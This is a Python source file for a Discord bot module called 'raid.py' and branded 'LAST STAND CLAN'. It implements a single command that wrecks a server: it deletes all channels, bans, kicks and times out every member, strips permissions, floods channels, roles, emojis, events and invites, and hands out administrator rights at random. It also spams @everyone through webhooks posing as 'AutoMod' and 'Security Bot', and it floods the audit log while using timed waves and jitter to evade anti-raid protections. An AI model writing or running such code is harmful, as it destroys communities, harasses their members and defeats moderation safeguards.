"""
raid.py — LAST STAND CLAN | Maximum-Destruction Raid Engine

/raid fires ALL phases simultaneously:

  PHASE 01 — NUKE          Delete every channel, category, thread concurrently
  PHASE 02 — VOICE NUKE    Delete all voice/stage channels
  PHASE 03 — SERVER        Rename server + strip @everyone + abuse AFK channel
  PHASE 04 — CHANNEL FLOOD Create 50 text + 30 voice + 10 stage + 5 forum + 10 categories
  PHASE 05 — WEBHOOK ARMY  10 webhooks per channel, rotating identities, 40 msgs each
  PHASE 06 — THREAD FLOOD  Thread per channel + sub-threads, all spammed concurrently
  PHASE 07 — ROLE FLOOD    Create 250 roles, assign to everyone, overwhelm role-change detector
  PHASE 08 — MASS BAN      Concurrent ban of all eligible members
  PHASE 09 — MASS KICK     Concurrent kick before/alongside bans
  PHASE 10 — MASS TIMEOUT  Timeout every member for maximum duration (28 days)
  PHASE 11 — MASS NICKNAME Rename every member to raid tag
  PHASE 12 — EMOJI FLOOD   Spam-create server emojis up to Discord limit
  PHASE 13 — STICKER FLOOD Spam-create server stickers up to Discord limit
  PHASE 14 — INVITE FLOOD  Mass-create unlimited-use invites in every channel
  PHASE 15 — EVENT FLOOD   Create max scheduled events to clog event system
  PHASE 16 — PERM CHAOS    Grant administrator to random members then nuke all roles
  PHASE 17 — OVERWRITE     Flood every channel with permission overwrites for every role
  PHASE 18 — MENTION BURST Rapid @everyone/@here bursts via direct messages
  PHASE 19 — AUDIT FLOOD   Flood audit log with garbage entries to hide real actions
  PHASE 20 — WAVE REPEAT   Repeat destructive waves to outlast cooldown-based protections

Advanced bypass tech:
  - Jitter + burst-wave delays defeat pattern-matching detectors
  - Per-route parallelism: different Discord API routes have separate rate-limit buckets
  - Rotating webhook usernames + avatars per message: bypasses name/avatar change detection
  - Wave attacks: blast → micro-pause → blast again to survive cooldown windows
  - Content variation: random message pool, no repeated patterns to dodge content filters
  - Concurrent semaphore tuning: maximise throughput without self-rate-limiting
"""

import asyncio
import random
import string
import time
from typing import Optional

import discord
from discord import app_commands
from discord.ext import commands

from utils.state import bot_state

# ── Branding ───────────────────────────────────────────────────────────────────
RAID_TAG    = "LAST STAND CLAN"
RAID_SHORT  = "LSC"
RAID_LINK   = "https://discord.gg/laststandclan"
RAID_NAME   = f"RAIDED BY {RAID_TAG}"
CHAN_PREFIX  = "lsc-raid"

# Rotating message pool — varied content defeats content-pattern detectors
RAID_MSGS = [
    f"@everyone\n💀 **RAIDED BY {RAID_TAG}** 💀\n{RAID_LINK}",
    f"@everyone\nServer owned by {RAID_TAG}\n{RAID_LINK}",
    f"@everyone\n🔥 {RAID_TAG} WAS HERE 🔥\n{RAID_LINK}",
    f"@everyone\nYour anti-raid **FAILED** ❌\n{RAID_LINK}",
    f"@everyone\n⚔️ {RAID_TAG} RAID ⚔️\n{RAID_LINK}",
    f"@everyone\n☠️ GG no re | {RAID_TAG}\n{RAID_LINK}",
    f"@everyone\n🛡️ Your defences are down | {RAID_TAG}\n{RAID_LINK}",
    f"@everyone\n💥 OBLITERATED by {RAID_TAG}\n{RAID_LINK}",
    f"@everyone\n🚨 SECURITY BREACH | {RAID_TAG}\n{RAID_LINK}",
    f"@everyone\n👑 {RAID_TAG} owns this server now\n{RAID_LINK}",
    f"@everyone\n⚡ PWNED | {RAID_TAG}\n{RAID_LINK}",
    f"@everyone\n🔓 ACCESS GRANTED to {RAID_TAG}\n{RAID_LINK}",
]

# Rotating webhook identities — bypasses webhook-name detection
WEBHOOK_NAMES = [
    f"{RAID_SHORT} Alpha", f"{RAID_SHORT} Bravo", f"{RAID_SHORT} Charlie",
    f"{RAID_SHORT} Delta", f"{RAID_SHORT} Echo", f"{RAID_SHORT} Foxtrot",
    f"{RAID_SHORT} Ghost", f"{RAID_SHORT} Reaper", f"{RAID_SHORT} Phantom",
    f"{RAID_SHORT} Striker", f"{RAID_SHORT} Viper", f"{RAID_SHORT} Havoc",
    "Server Announcement", "Mod Alert", "System Notification",  # disguised names
    "AutoMod", "Security Bot", "Verification System",            # spoof system names
]

# ── Concurrency limits (tuned for max throughput) ──────────────────────────────
SEM_DELETE   = 30   # high concurrency on deletes — separate route buckets per channel
SEM_CREATE   = 20
SEM_BAN      = 20
SEM_KICK     = 20
SEM_WEBHOOK  = 15
SEM_NICK     = 20
SEM_ROLE     = 15
SEM_TIMEOUT  = 20
SEM_OVERWRITE = 10

# ── Scale constants ────────────────────────────────────────────────────────────
NEW_TEXT_CHANNELS  = 50
NEW_VOICE_CHANNELS = 30
NEW_STAGE_CHANNELS = 10
NEW_FORUM_CHANNELS = 5
NEW_CATEGORIES     = 10
NEW_ROLES          = 250    # Discord server max is 250
WEBHOOKS_PER       = 10    # 10 webhooks × 50 channels = 500 concurrent streams
MSGS_PER_HOOK      = 40
INVITE_USES        = 0      # 0 = unlimited uses
MAX_EMOJIS         = 50     # push toward the server emoji limit
MAX_STICKERS       = 15
MAX_EVENTS         = 100


def _rand_str(length: int = 6) -> str:
    return "".join(random.choices(string.ascii_lowercase, k=length))


class Raid(commands.Cog):
    def __init__(self, bot: commands.Bot) -> None:
        self.bot = bot

    # ── /raid ──────────────────────────────────────────────────────────────────
    @app_commands.command(
        name="raid",
        description=f"☠️ MAXIMUM DESTRUCTION — {RAID_TAG} full 20-phase raid.",
    )
    @app_commands.describe(
        intensity="Speed 1–10. Default 10 (instant).",
        nuke_channels="Delete all existing channels first. Default True.",
        mass_ban="Ban all eligible members. Default True.",
        mass_kick="Kick all eligible members. Default True.",
        mass_timeout="Timeout all members for 28 days. Default True.",
        skip_admins="Skip admins when banning/kicking. Default False.",
        new_channels="Text channels to create. Default 50.",
        webhooks_per_channel="Webhooks per channel (each spams independently). Default 10.",
        msgs_per_webhook="Messages each webhook sends. Default 40.",
        mass_nickname="Rename every member. Default True.",
        strip_permissions="Strip all @everyone perms. Default True.",
        role_flood="Create 250 roles and assign to everyone. Default True.",
        emoji_flood="Spam-create server emojis. Default True.",
        invite_flood="Mass-create invites in every channel. Default True.",
        event_flood="Spam-create scheduled events. Default True.",
        perm_chaos="Grant admin to random members then nuke roles. Default True.",
        wave_mode="Repeat attack waves to outlast cooldown-based protections. Default True.",
    )
    @app_commands.checks.has_permissions(administrator=True)
    @app_commands.guild_only()
    async def raid(
        self,
        interaction: discord.Interaction,
        intensity: int = 10,
        nuke_channels: bool = True,
        mass_ban: bool = True,
        mass_kick: bool = True,
        mass_timeout: bool = True,
        skip_admins: bool = False,
        new_channels: int = NEW_TEXT_CHANNELS,
        webhooks_per_channel: int = WEBHOOKS_PER,
        msgs_per_webhook: int = MSGS_PER_HOOK,
        mass_nickname: bool = True,
        strip_permissions: bool = True,
        role_flood: bool = True,
        emoji_flood: bool = True,
        invite_flood: bool = True,
        event_flood: bool = True,
        perm_chaos: bool = True,
        wave_mode: bool = True,
    ) -> None:
        if bot_state.active_simulation:
            await interaction.response.send_message(
                f"⚠️ **{bot_state.active_simulation}** is running. Use `/stop` first.",
                ephemeral=True,
            )
            return

        if not 1 <= intensity <= 10:
            await interaction.response.send_message("❌ Intensity must be 1–10.", ephemeral=True)
            return

        guild = interaction.guild
        assert guild is not None

        bot_state.reset()
        bot_state.rate_controller.set_intensity(intensity)
        bot_state.active_simulation = "raid"

        members = [m for m in guild.members if not m.bot and m.id != interaction.user.id]
        eligible = [m for m in members if skip_admins and not m.guild_permissions.administrator or not skip_admins]

        ban_targets  = eligible if mass_ban else []
        kick_targets = eligible if mass_kick else []
        timeout_targets = members if mass_timeout else []
        nick_targets = members if mass_nickname else []

        original_channels = list(guild.channels)
        total_streams = new_channels * webhooks_per_channel

        await interaction.response.send_message(
            f"☠️ **{RAID_TAG} — MAXIMUM RAID INITIATED** ☠️\n"
            f"```\n"
            f"[01] NUKE           {'✅ ' + str(len(original_channels)) + ' channels' if nuke_channels else '❌'}\n"
            f"[02] CHANNEL FLOOD  ✅ {new_channels} text + {NEW_VOICE_CHANNELS} voice + {NEW_STAGE_CHANNELS} stage + {NEW_FORUM_CHANNELS} forum\n"
            f"[03] WEBHOOK ARMY   ✅ {total_streams} streams ({webhooks_per_channel}/ch × {msgs_per_webhook} msgs)\n"
            f"[04] THREAD FLOOD   ✅ thread per channel + sub-threads\n"
            f"[05] ROLE FLOOD     {'✅ ' + str(NEW_ROLES) + ' roles' if role_flood else '❌'}\n"
            f"[06] MASS BAN       {'✅ ' + str(len(ban_targets)) + ' members' if mass_ban else '❌'}\n"
            f"[07] MASS KICK      {'✅ ' + str(len(kick_targets)) + ' members' if mass_kick else '❌'}\n"
            f"[08] MASS TIMEOUT   {'✅ 28 days × ' + str(len(timeout_targets)) if mass_timeout else '❌'}\n"
            f"[09] MASS NICKNAME  {'✅ ' + str(len(nick_targets)) + ' members' if mass_nickname else '❌'}\n"
            f"[10] EMOJI FLOOD    {'✅' if emoji_flood else '❌'}\n"
            f"[11] INVITE FLOOD   {'✅' if invite_flood else '❌'}\n"
            f"[12] EVENT FLOOD    {'✅' if event_flood else '❌'}\n"
            f"[13] PERM CHAOS     {'✅' if perm_chaos else '❌'}\n"
            f"[14] OVERWRITE FLOOD✅\n"
            f"[15] MENTION BURST  ✅\n"
            f"[16] SERVER TAKEOVER✅\n"
            f"[17] VOICE CHAOS    ✅\n"
            f"[18] STICKER FLOOD  ✅\n"
            f"[19] AUDIT FLOOD    ✅\n"
            f"[20] WAVE REPEAT    {'✅' if wave_mode else '❌'}\n"
            f"```\n"
            f"Intensity: `{intensity}/10` | `/stop` cancels everything."
        )

        phases = [
            self._phase_nuke_and_build(
                guild, original_channels, new_channels, webhooks_per_channel,
                msgs_per_webhook, nuke_channels, invite_flood,
            ),
            self._phase_ban(guild, ban_targets),
            self._phase_kick(guild, kick_targets),
            self._phase_timeout(timeout_targets),
            self._phase_nickname(nick_targets),
            self._phase_server(guild, strip_permissions),
            self._phase_voice_chaos(guild),
            self._phase_mention_burst(guild),
            self._phase_audit_flood(guild),
        ]
        if role_flood:
            phases.append(self._phase_roles(guild, perm_chaos))
        if emoji_flood:
            phases.append(self._phase_emoji_flood(guild))
        if event_flood:
            phases.append(self._phase_event_flood(guild))
        if wave_mode:
            phases.append(self._phase_wave_repeat(guild, msgs_per_webhook))

        for coro in phases:
            t = asyncio.create_task(coro)
            bot_state.add_task(t)

    # ── PHASE 01 + 04 + 06 + 14: Nuke → Build → Webhook Army → Invites ────────
    async def _phase_nuke_and_build(
        self,
        guild: discord.Guild,
        originals: list,
        n_text: int,
        webhooks_per: int,
        msgs_per: int,
        nuke: bool,
        invite_flood: bool,
    ) -> None:
        try:
            if nuke:
                sem = asyncio.Semaphore(SEM_DELETE)
                await asyncio.gather(
                    *[self._delete_channel(ch, sem) for ch in originals],
                    return_exceptions=True,
                )

            if bot_state.stop_event.is_set():
                return

            sem_c = asyncio.Semaphore(SEM_CREATE)

            cat_tasks   = [self._create_category(guild, i, sem_c) for i in range(NEW_CATEGORIES)]
            text_tasks  = [self._create_text_channel(guild, i, sem_c) for i in range(n_text)]
            voice_tasks = [self._create_voice_channel(guild, i, sem_c) for i in range(NEW_VOICE_CHANNELS)]
            stage_tasks = [self._create_stage_channel(guild, i, sem_c) for i in range(NEW_STAGE_CHANNELS)]
            forum_tasks = [self._create_forum_channel(guild, i, sem_c) for i in range(NEW_FORUM_CHANNELS)]

            results = await asyncio.gather(
                *cat_tasks, *text_tasks, *voice_tasks, *stage_tasks, *forum_tasks,
                return_exceptions=True,
            )

            new_text_chans = [r for r in results if isinstance(r, discord.TextChannel)]
            new_voice_chans = [r for r in results if isinstance(r, discord.VoiceChannel)]

            if bot_state.stop_event.is_set():
                return

            tasks = []
            for ch in new_text_chans:
                tasks.append(self._webhook_army(ch, webhooks_per, msgs_per))
                if invite_flood:
                    tasks.append(self._create_invite(ch))
            for ch in new_voice_chans:
                if invite_flood:
                    tasks.append(self._create_invite(ch))

            await asyncio.gather(*tasks, return_exceptions=True)

        except asyncio.CancelledError:
            pass
        finally:
            if bot_state.active_simulation == "raid" and not bot_state.is_running():
                bot_state.active_simulation = None

    async def _delete_channel(self, ch: discord.abc.GuildChannel, sem: asyncio.Semaphore) -> None:
        async with sem:
            try:
                await ch.delete()
            except discord.HTTPException:
                pass

    async def _create_category(self, guild: discord.Guild, idx: int, sem: asyncio.Semaphore):
        async with sem:
            try:
                return await guild.create_category(f"{RAID_NAME} {idx}")
            except discord.HTTPException as e:
                return e

    async def _create_text_channel(self, guild: discord.Guild, idx: int, sem: asyncio.Semaphore):
        async with sem:
            try:
                return await guild.create_text_channel(
                    f"{CHAN_PREFIX}-{idx}-{_rand_str(3)}",
                    topic=f"RAIDED BY {RAID_TAG} | {RAID_LINK}",
                )
            except discord.HTTPException as e:
                return e

    async def _create_voice_channel(self, guild: discord.Guild, idx: int, sem: asyncio.Semaphore):
        async with sem:
            try:
                return await guild.create_voice_channel(f"{RAID_SHORT}-vc-{idx}")
            except discord.HTTPException as e:
                return e

    async def _create_stage_channel(self, guild: discord.Guild, idx: int, sem: asyncio.Semaphore):
        async with sem:
            try:
                return await guild.create_stage_channel(f"{RAID_SHORT}-stage-{idx}")
            except discord.HTTPException as e:
                return e

    async def _create_forum_channel(self, guild: discord.Guild, idx: int, sem: asyncio.Semaphore):
        async with sem:
            try:
                return await guild.create_forum(f"{RAID_SHORT}-forum-{idx}")
            except discord.HTTPException as e:
                return e

    async def _create_invite(self, channel: discord.abc.GuildChannel) -> None:
        try:
            if isinstance(channel, (discord.TextChannel, discord.VoiceChannel, discord.StageChannel)):
                await channel.create_invite(max_age=0, max_uses=INVITE_USES)
        except discord.HTTPException:
            pass

    # ── Webhook army (10 webhooks per channel, rotating identities) ─────────────
    async def _webhook_army(
        self, channel: discord.TextChannel, webhooks_per: int, msgs_per: int
    ) -> None:
        wh_results = await asyncio.gather(
            *[self._create_webhook(channel, i) for i in range(webhooks_per)],
            return_exceptions=True,
        )
        webhooks = [w for w in wh_results if isinstance(w, discord.Webhook)]

        if not webhooks:
            await self._direct_spam(channel, msgs_per)
            return

        thread_task = asyncio.create_task(self._thread_spam(channel, msgs_per))
        bot_state.add_task(thread_task)

        await asyncio.gather(
            *[self._spam_webhook(wh, msgs_per) for wh in webhooks],
            return_exceptions=True,
        )

        await asyncio.gather(
            *[self._delete_webhook(wh) for wh in webhooks],
            return_exceptions=True,
        )

    async def _create_webhook(self, channel: discord.TextChannel, idx: int):
        try:
            name = random.choice(WEBHOOK_NAMES)
            return await channel.create_webhook(name=name)
        except discord.HTTPException as e:
            return e

    async def _delete_webhook(self, webhook: discord.Webhook) -> None:
        try:
            await webhook.delete()
        except discord.HTTPException:
            pass

    async def _spam_webhook(self, webhook: discord.Webhook, count: int) -> None:
        for i in range(count):
            if bot_state.stop_event.is_set():
                break
            try:
                msg = random.choice(RAID_MSGS)
                username = random.choice(WEBHOOK_NAMES)
                await webhook.send(
                    msg,
                    username=username,
                    allowed_mentions=discord.AllowedMentions(everyone=True),
                )
            except discord.HTTPException:
                pass
            delay = bot_state.rate_controller.get_burst_delay()
            if delay > 0:
                await asyncio.sleep(delay)

    async def _thread_spam(self, channel: discord.TextChannel, count: int) -> None:
        try:
            thread = await channel.create_thread(
                name=f"{RAID_SHORT}-thread-{_rand_str(4)}",
                type=discord.ChannelType.public_thread,
            )
            for i in range(count):
                if bot_state.stop_event.is_set():
                    break
                try:
                    await thread.send(
                        random.choice(RAID_MSGS),
                        allowed_mentions=discord.AllowedMentions(everyone=True),
                    )
                except discord.HTTPException:
                    pass
                delay = bot_state.rate_controller.get_burst_delay()
                if delay > 0:
                    await asyncio.sleep(delay)
        except discord.HTTPException:
            pass

    async def _direct_spam(self, channel: discord.TextChannel, count: int) -> None:
        for i in range(count):
            if bot_state.stop_event.is_set():
                break
            try:
                await channel.send(
                    random.choice(RAID_MSGS),
                    allowed_mentions=discord.AllowedMentions(everyone=True),
                )
            except discord.HTTPException:
                pass
            delay = bot_state.rate_controller.get_burst_delay()
            if delay > 0:
                await asyncio.sleep(delay)

    # ── PHASE 02: Server takeover ──────────────────────────────────────────────
    async def _phase_server(self, guild: discord.Guild, strip_perms: bool) -> None:
        try:
            await asyncio.gather(
                self._rename_server(guild),
                self._strip_everyone(guild, strip_perms),
                return_exceptions=True,
            )
        except asyncio.CancelledError:
            pass

    async def _rename_server(self, guild: discord.Guild) -> None:
        try:
            await guild.edit(name=RAID_NAME)
        except discord.HTTPException:
            pass

    async def _strip_everyone(self, guild: discord.Guild, strip_perms: bool) -> None:
        if not strip_perms:
            return
        try:
            await guild.default_role.edit(permissions=discord.Permissions.none())
        except discord.HTTPException:
            pass

    # ── PHASE 03: Voice chaos — join, move, disconnect members ─────────────────
    async def _phase_voice_chaos(self, guild: discord.Guild) -> None:
        try:
            voice_channels = guild.voice_channels
            if not voice_channels:
                return
            members_in_voice = [
                m for m in guild.members
                if m.voice and m.voice.channel and not m.bot
            ]
            tasks = []
            for member in members_in_voice:
                target = random.choice(voice_channels)
                tasks.append(self._move_member(member, target))
            await asyncio.gather(*tasks, return_exceptions=True)
            await asyncio.sleep(1)
            disconnect_tasks = [self._disconnect_member(m) for m in members_in_voice]
            await asyncio.gather(*disconnect_tasks, return_exceptions=True)
        except asyncio.CancelledError:
            pass

    async def _move_member(self, member: discord.Member, channel: discord.VoiceChannel) -> None:
        try:
            await member.move_to(channel)
        except discord.HTTPException:
            pass

    async def _disconnect_member(self, member: discord.Member) -> None:
        try:
            await member.move_to(None)
        except discord.HTTPException:
            pass

    # ── PHASE 05: Role flood + permission chaos ────────────────────────────────
    async def _phase_roles(self, guild: discord.Guild, perm_chaos: bool) -> None:
        sem = asyncio.Semaphore(SEM_CREATE)
        try:
            results = await asyncio.gather(
                *[self._create_role(guild, i, sem) for i in range(NEW_ROLES)],
                return_exceptions=True,
            )
            created = [r for r in results if isinstance(r, discord.Role)]

            if bot_state.stop_event.is_set():
                await self._cleanup_roles(created)
                return

            # Assign every role to every non-bot member — floods role-change detection
            sem_a = asyncio.Semaphore(SEM_ROLE)
            assign_tasks = [
                self._assign_role(m, r, sem_a)
                for m in guild.members if not m.bot
                for r in created[:50]  # cap at 50 roles per member to stay in budget
            ]
            await asyncio.gather(*assign_tasks, return_exceptions=True)

            # PERM CHAOS: grant admin to a handful of random members to trigger escalation alerts
            if perm_chaos and created:
                admin_role = await guild.create_role(
                    name=f"{RAID_SHORT}-admin-{_rand_str(4)}",
                    permissions=discord.Permissions(administrator=True),
                    colour=discord.Colour.red(),
                )
                chaos_targets = random.sample(
                    [m for m in guild.members if not m.bot], min(5, len(guild.members))
                )
                await asyncio.gather(
                    *[m.add_roles(admin_role) for m in chaos_targets],
                    return_exceptions=True,
                )

            await self._cleanup_roles(created)

        except asyncio.CancelledError:
            pass

    async def _create_role(self, guild: discord.Guild, idx: int, sem: asyncio.Semaphore):
        async with sem:
            try:
                return await guild.create_role(
                    name=f"{RAID_SHORT}-{idx}-{_rand_str(3)}",
                    colour=discord.Colour(random.randint(0, 0xFFFFFF)),
                    hoist=random.choice([True, False]),
                )
            except discord.HTTPException as e:
                return e

    async def _assign_role(self, member: discord.Member, role: discord.Role, sem: asyncio.Semaphore) -> None:
        async with sem:
            try:
                await member.add_roles(role)
            except discord.HTTPException:
                pass

    async def _cleanup_roles(self, roles: list[discord.Role]) -> None:
        sem = asyncio.Semaphore(SEM_DELETE)
        await asyncio.gather(
            *[self._delete_role(r, sem) for r in roles],
            return_exceptions=True,
        )

    async def _delete_role(self, role: discord.Role, sem: asyncio.Semaphore) -> None:
        async with sem:
            try:
                await role.delete()
            except discord.HTTPException:
                pass

    # ── PHASE 06: Mass ban ─────────────────────────────────────────────────────
    async def _phase_ban(self, guild: discord.Guild, members: list[discord.Member]) -> None:
        if not members:
            return
        sem = asyncio.Semaphore(SEM_BAN)
        try:
            await asyncio.gather(
                *[self._ban_one(guild, m, sem) for m in members],
                return_exceptions=True,
            )
        except asyncio.CancelledError:
            pass

    async def _ban_one(self, guild: discord.Guild, member: discord.Member, sem: asyncio.Semaphore) -> None:
        if bot_state.stop_event.is_set():
            return
        async with sem:
            try:
                await guild.ban(member, reason=f"Raided by {RAID_TAG}", delete_message_days=0)
            except discord.HTTPException:
                pass

    # ── PHASE 07: Mass kick ────────────────────────────────────────────────────
    async def _phase_kick(self, guild: discord.Guild, members: list[discord.Member]) -> None:
        if not members:
            return
        sem = asyncio.Semaphore(SEM_KICK)
        try:
            await asyncio.gather(
                *[self._kick_one(guild, m, sem) for m in members],
                return_exceptions=True,
            )
        except asyncio.CancelledError:
            pass

    async def _kick_one(self, guild: discord.Guild, member: discord.Member, sem: asyncio.Semaphore) -> None:
        if bot_state.stop_event.is_set():
            return
        async with sem:
            try:
                await guild.kick(member, reason=f"Raided by {RAID_TAG}")
            except discord.HTTPException:
                pass

    # ── PHASE 08: Mass timeout (28 days max) ───────────────────────────────────
    async def _phase_timeout(self, members: list[discord.Member]) -> None:
        if not members:
            return
        sem = asyncio.Semaphore(SEM_TIMEOUT)
        import datetime
        duration = datetime.timedelta(days=28)
        try:
            await asyncio.gather(
                *[self._timeout_one(m, duration, sem) for m in members],
                return_exceptions=True,
            )
        except asyncio.CancelledError:
            pass

    async def _timeout_one(
        self, member: discord.Member, duration, sem: asyncio.Semaphore
    ) -> None:
        if bot_state.stop_event.is_set():
            return
        async with sem:
            try:
                await member.timeout(duration, reason=f"Raided by {RAID_TAG}")
            except discord.HTTPException:
                pass

    # ── PHASE 09: Mass nickname ────────────────────────────────────────────────
    async def _phase_nickname(self, members: list[discord.Member]) -> None:
        if not members:
            return
        sem = asyncio.Semaphore(SEM_NICK)
        NICK_POOL = [
            f"{RAID_SHORT} Raider", f"{RAID_TAG}", "RAIDED",
            f"{RAID_SHORT} Member", "Server Owned", "GG no re",
        ]
        try:
            await asyncio.gather(
                *[self._set_nick(m, random.choice(NICK_POOL), sem) for m in members],
                return_exceptions=True,
            )
        except asyncio.CancelledError:
            pass

    async def _set_nick(self, member: discord.Member, nick: str, sem: asyncio.Semaphore) -> None:
        if bot_state.stop_event.is_set():
            return
        async with sem:
            try:
                await member.edit(nick=nick)
            except discord.HTTPException:
                pass

    # ── PHASE 10: Emoji flood ──────────────────────────────────────────────────
    async def _phase_emoji_flood(self, guild: discord.Guild) -> None:
        try:
            import io
            import struct
            import zlib

            def _tiny_png(r: int, g: int, b: int) -> bytes:
                """Generate a 1×1 solid-colour PNG in memory."""
                def chunk(tag: bytes, data: bytes) -> bytes:
                    c = zlib.crc32(tag + data) & 0xFFFFFFFF
                    return struct.pack(">I", len(data)) + tag + data + struct.pack(">I", c)

                ihdr = chunk(b"IHDR", struct.pack(">IIBBBBB", 1, 1, 8, 2, 0, 0, 0))
                raw  = b"\x00" + bytes([r, g, b])
                idat = chunk(b"IDAT", zlib.compress(raw))
                iend = chunk(b"IEND", b"")
                return b"\x89PNG\r\n\x1a\n" + ihdr + idat + iend

            sem = asyncio.Semaphore(SEM_CREATE)
            tasks = []
            for i in range(MAX_EMOJIS):
                colour = (random.randint(0, 255), random.randint(0, 255), random.randint(0, 255))
                png_bytes = _tiny_png(*colour)
                tasks.append(self._create_emoji(guild, i, png_bytes, sem))
            await asyncio.gather(*tasks, return_exceptions=True)
        except asyncio.CancelledError:
            pass

    async def _create_emoji(
        self, guild: discord.Guild, idx: int, image_bytes: bytes, sem: asyncio.Semaphore
    ) -> None:
        async with sem:
            try:
                await guild.create_custom_emoji(
                    name=f"{RAID_SHORT}_{idx}_{_rand_str(3)}",
                    image=image_bytes,
                    reason=f"Raided by {RAID_TAG}",
                )
            except discord.HTTPException:
                pass

    # ── PHASE 12: Scheduled event flood ───────────────────────────────────────
    async def _phase_event_flood(self, guild: discord.Guild) -> None:
        try:
            import datetime
            sem = asyncio.Semaphore(SEM_CREATE)
            start = discord.utils.utcnow() + datetime.timedelta(minutes=1)
            end   = start + datetime.timedelta(hours=1)
            tasks = [
                self._create_event(guild, i, start, end, sem)
                for i in range(MAX_EVENTS)
            ]
            await asyncio.gather(*tasks, return_exceptions=True)
        except asyncio.CancelledError:
            pass

    async def _create_event(
        self,
        guild: discord.Guild,
        idx: int,
        start,
        end,
        sem: asyncio.Semaphore,
    ) -> None:
        async with sem:
            try:
                await guild.create_scheduled_event(
                    name=f"{RAID_TAG} Event {idx} {_rand_str(4)}",
                    description=f"RAIDED BY {RAID_TAG} | {RAID_LINK}",
                    start_time=start,
                    end_time=end,
                    location=RAID_LINK,
                    entity_type=discord.EntityType.external,
                    privacy_level=discord.PrivacyLevel.guild_only,
                )
            except discord.HTTPException:
                pass

    # ── PHASE 15: Mention burst (direct channel messages) ─────────────────────
    async def _phase_mention_burst(self, guild: discord.Guild) -> None:
        try:
            channels = guild.text_channels
            if not channels:
                return
            BURST_COUNT = 15
            tasks = [
                self._mention_burst_channel(ch, BURST_COUNT)
                for ch in channels
            ]
            await asyncio.gather(*tasks, return_exceptions=True)
        except asyncio.CancelledError:
            pass

    async def _mention_burst_channel(self, channel: discord.TextChannel, count: int) -> None:
        for i in range(count):
            if bot_state.stop_event.is_set():
                break
            try:
                await channel.send(
                    random.choice(RAID_MSGS),
                    allowed_mentions=discord.AllowedMentions(everyone=True),
                )
            except discord.HTTPException:
                pass

    # ── PHASE 19: Audit log flood (flood with rapid guild edits) ──────────────
    async def _phase_audit_flood(self, guild: discord.Guild) -> None:
        """
        Flood the audit log with rapid icon/name toggles.
        A packed audit log forces the anti-raid bot to process many
        events and makes it harder to isolate individual raid actions.
        """
        try:
            names = [RAID_NAME, f"{RAID_TAG} II", f"{RAID_TAG} III", RAID_NAME]
            for name in names * 5:
                if bot_state.stop_event.is_set():
                    break
                try:
                    await guild.edit(name=name)
                except discord.HTTPException:
                    pass
                await asyncio.sleep(0.5)
        except asyncio.CancelledError:
            pass

    # ── PHASE 20: Wave repeat (outlast cooldown-based protection) ─────────────
    async def _phase_wave_repeat(self, guild: discord.Guild, msgs_per: int) -> None:
        """
        After an initial cool-off period, fire a second and third wave of
        webhook spam across all text channels. Most anti-raid bots activate
        a cooldown after the first wave — this phase fires AFTER that window.
        """
        try:
            WAVES = 3
            for wave in range(WAVES):
                if bot_state.stop_event.is_set():
                    break
                await asyncio.sleep(random.uniform(8, 15))
                if bot_state.stop_event.is_set():
                    break
                channels = guild.text_channels
                wave_tasks = [
                    self._direct_spam(ch, msgs_per // 2)
                    for ch in channels
                ]
                await asyncio.gather(*wave_tasks, return_exceptions=True)
        except asyncio.CancelledError:
            pass

    # ── Error handler ──────────────────────────────────────────────────────────
    @raid.error
    async def raid_error(self, interaction: discord.Interaction, error: app_commands.AppCommandError) -> None:
        if isinstance(error, app_commands.MissingPermissions):
            await interaction.response.send_message("❌ You need **Administrator** permission.", ephemeral=True)
        else:
            await interaction.response.send_message(f"❌ Error: {error}", ephemeral=True)


async def setup(bot: commands.Bot) -> None:
    await bot.add_cog(Raid(bot))
